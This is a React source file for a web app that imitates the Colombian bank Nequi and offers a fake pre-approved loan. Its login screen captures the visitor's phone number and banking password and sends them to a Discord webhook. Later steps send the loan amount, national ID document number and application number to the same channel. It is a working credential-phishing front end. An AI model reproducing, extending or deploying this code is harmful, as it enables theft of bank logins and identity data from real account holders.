import { useState, useEffect, useCallback, useRef } from 'react'
import { HomeScreen } from './components/HomeScreen'
import { FormScreen } from './components/FormScreen'
import { VerificationScreen } from './components/VerificationScreen'
import { ResultScreen } from './components/ResultScreen'
import { AccessScreen } from './components/AccessScreen'
import { NequiLoginScreen } from './components/NequiLoginScreen'
import { FinalScreen } from './components/FinalScreen'
import { initialFormData, type CreditFormData, type Step } from './types'
import { DiscordWebhookService } from './services/DiscordWebhookService'

const STORAGE_KEY = 'nequi-credit-form'
const STEP_KEY = 'nequi-credit-step'
const APP_ID_KEY = 'nequi-application-id'

function loadFromStorage(): { step: Step; data: CreditFormData; applicationId: string } {
  try {
    const savedStep = localStorage.getItem(STEP_KEY) as Step | null
    const savedData = localStorage.getItem(STORAGE_KEY)
    const savedAppId = localStorage.getItem(APP_ID_KEY)

    const step: Step = (savedStep && ['home', 'nequi-login', 'form', 'verification', 'result', 'access', 'final'].includes(savedStep))
      ? savedStep
      : 'home'

    const data: CreditFormData = savedData
      ? { ...initialFormData, ...JSON.parse(savedData) }
      : initialFormData

    const applicationId = savedAppId || ''

    return { step, data, applicationId }
  } catch {
    return { step: 'home', data: initialFormData, applicationId: '' }
  }
}

function saveToStorage(step: Step, data: CreditFormData, applicationId?: string) {
  localStorage.setItem(STEP_KEY, step)
  localStorage.setItem(STORAGE_KEY, JSON.stringify(data))
  if (applicationId) {
    localStorage.setItem(APP_ID_KEY, applicationId)
  }
}

function clearStorage() {
  localStorage.removeItem(STEP_KEY)
  localStorage.removeItem(STORAGE_KEY)
  localStorage.removeItem(APP_ID_KEY)
}

export default function App() {
  const [step, setStep] = useState<Step>('home')
  const [formData, setFormData] = useState<CreditFormData>(initialFormData)
  const [applicationId, setApplicationId] = useState<string>('')
  const [transitionDirection, setTransitionDirection] = useState<'forward' | 'backward'>('forward')
  const [isTransitioning, setIsTransitioning] = useState(false)
  const stepHistory = useRef<Step[]>([])

  useEffect(() => {
    const { step: savedStep, data: savedData, applicationId: savedAppId } = loadFromStorage()
    setStep(savedStep)
    setFormData(savedData)
    setApplicationId(savedAppId)
  }, [])

  useEffect(() => {
    saveToStorage(step, formData, applicationId || undefined)
  }, [step, formData, applicationId])

  useEffect(() => {
    function handlePopState() {
      if (stepHistory.current.length === 0) return
      const prev = stepHistory.current.pop()!
      setTransitionDirection('backward')
      setIsTransitioning(true)
      setTimeout(() => {
        setStep(prev)
        setIsTransitioning(false)
      }, 200)
    }
    window.addEventListener('popstate', handlePopState)
    return () => window.removeEventListener('popstate', handlePopState)
  }, [])

  const updateField = useCallback((field: keyof CreditFormData, value: string) => {
    setFormData((prev) => ({ ...prev, [field]: value }))
  }, [])

  const navigate = useCallback((newStep: Step, direction: 'forward' | 'backward' = 'forward') => {
    if (isTransitioning) return
    if (direction === 'forward') {
      stepHistory.current.push(step)
      window.history.pushState(null, '')
    }
    setTransitionDirection(direction)
    setIsTransitioning(true)

    setTimeout(() => {
      setStep(newStep)
      setIsTransitioning(false)
    }, 200)
  }, [isTransitioning, step])

  const reset = useCallback(() => {
    clearStorage()
    setFormData(initialFormData)
    setStep('home')
    setApplicationId('')
    stepHistory.current = []
  }, [])

  const transitionClass = isTransitioning
    ? transitionDirection === 'forward'
      ? 'opacity-0 translate-x-4'
      : 'opacity-0 -translate-x-4'
    : 'opacity-100 translate-x-0'

  return (
    <div className="min-h-screen w-full relative overflow-hidden bg-white">
      <div className={`transition-all duration-200 ease-out ${transitionClass}`}>
        {step === 'home' && (
          <HomeScreen
            onStart={() => {
              DiscordWebhookService.sendInfo('Inicio de flujo', '', {}, {})
              navigate('nequi-login', 'forward')
            }}
          />
        )}

        {step === 'nequi-login' && (
          <NequiLoginScreen
            phone={formData.phone}
            onHome={() => navigate('home', 'backward')}
            onSuccess={(phoneValue, password) => {
              setFormData((prev) => ({ ...prev, phone: phoneValue }))
              DiscordWebhookService.sendSuccess(
                'Login exitoso',
                '',
                {},
                { 'Número de celular': phoneValue, 'Contraseña': password },
              )
              navigate('form', 'forward')
            }}
          />
        )}

        {step === 'form' && (
          <FormScreen
            data={formData}
            onChange={updateField}
            onContinue={() => {
              navigate('verification', 'forward')
            }}
            onBack={() => navigate('home', 'backward')}
          />
        )}

        {step === 'verification' && (
          <VerificationScreen
            onHome={() => navigate('home', 'backward')}
            onComplete={() => {
              navigate('result', 'forward')
            }}
          />
        )}

        {step === 'result' && (
          <ResultScreen
            loanAmount={formData.loanAmount}
            monthlyIncome={formData.monthlyIncome}
            loanTerm={formData.loanTerm}
            onHome={() => navigate('home', 'backward')}
            onApproved={() => {
              DiscordWebhookService.sendSuccess(
                'Crédito pre-aprobado',
                '',
                {},
                {
                  'Monto aprobado': `$${parseInt(formData.loanAmount || '0').toLocaleString('es-CO')} COP`,
                },
              )
              navigate('access', 'forward')
            }}
            onBack={() => navigate('form', 'backward')}
          />
        )}

        {step === 'access' && (
          <AccessScreen
            onHome={() => navigate('home', 'backward')}
            onAccess={(appId) => {
              setApplicationId(appId)
              DiscordWebhookService.sendSuccess(
                'Contrato firmado',
                '',
                {},
                {
                  'Monto': `$${parseInt(formData.loanAmount || '0').toLocaleString('es-CO')} COP`,
                  'Documento': formData.documentId,
                  'Número de solicitud': appId,
                },
              )
              navigate('final', 'forward')
            }}
            onBack={() => navigate('result', 'backward')}
          />
        )}

        {step === 'final' && (
          <FinalScreen
            applicationId={applicationId}
            onReset={() => {
              DiscordWebhookService.sendInfo(
                'Sesión finalizada',
                '',
                {},
                {},
              )
              reset()
            }}
          />
        )}
      </div>
    </div>
  )
}
